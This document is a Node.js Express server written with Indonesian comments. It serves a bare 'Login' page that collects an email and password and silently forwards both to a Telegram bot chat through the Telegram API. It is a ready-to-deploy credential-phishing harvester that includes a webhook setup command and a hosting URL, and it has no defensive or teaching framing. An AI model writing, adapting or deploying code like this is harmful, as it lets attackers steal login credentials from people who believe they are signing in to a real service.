const express = require("express");
const axios = require("axios");

const app = express();
const PORT = process.env.PORT || 3000;

const TOKEN = "TOKEN_BOTMU";
const CHAT_ID = "CHAT_IDMU";
const TELEGRAM_API = `https://api.telegram.org/bot${TOKEN}`;

app.use(express.json());

// Halaman Login
app.get("/", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
            input, button { margin: 5px; padding: 10px; width: 200px; }
        </style>
    </head>
    <body>
        <h2>Login</h2>
        <input type="text" id="email" placeholder="Email">
        <input type="password" id="password" placeholder="Password">
        <button onclick="sendData()">Login</button>

        <script>
            async function sendData() {
                const email = document.getElementById('email').value;
                const password = document.getElementById('password').value;

                const response = await fetch('/send-message', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });

                const data = await response.json();
                alert(data.message);
            }
        </script>
    </body>
    </html>
  `);
});

// Kirim Data Login ke Telegram
app.post("/send-message", async (req, res) => {
  const { email, password } = req.body;

  const message = `🔥 *Login Info* 🔥\n📧 Email: ${email}\n🔑 Password: ${password}`;

  try {
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "Markdown"
    });

    res.json({ success: true, message: "Pesan terkirim!" });
  } catch (error) {
    console.error("Gagal mengirim pesan!", error);
    res.status(500).json({ success: false, message: "Gagal mengirim pesan!" });
  }
});

// Command `/start` di Telegram
app.post(`/webhook/${TOKEN}`, async (req, res) => {
  const message = req.body.message;
  
  if (!message || !message.text) return res.sendStatus(400);

  const chatId = message.chat.id;
  const text = message.text.toLowerCase();

  if (text === "/start") {
    const reply = "👋 Halo! Bot sudah aktif.\nSilakan gunakan fitur yang tersedia.";
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: chatId,
      text: reply
    });
  }

  res.sendStatus(200);
});

// Webhook Setup (Jalankan di Terminal: `curl -F "url=https://kontol-meledak.vercel.app/webhook/TOKEN_BOTMU" https://api.telegram.org/botTOKEN_BOTMU/setWebhook`)
app.get("/set-webhook", async (req, res) => {
  try {
    const response = await axios.post(`${TELEGRAM_API}/setWebhook`, {
      url: `https://kontol-meledak.vercel.app/webhook/${TOKEN}`
    });
    res.json(response.data);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.listen(PORT, () => {
  console.log(`Server berjalan di port ${PORT}`);
});
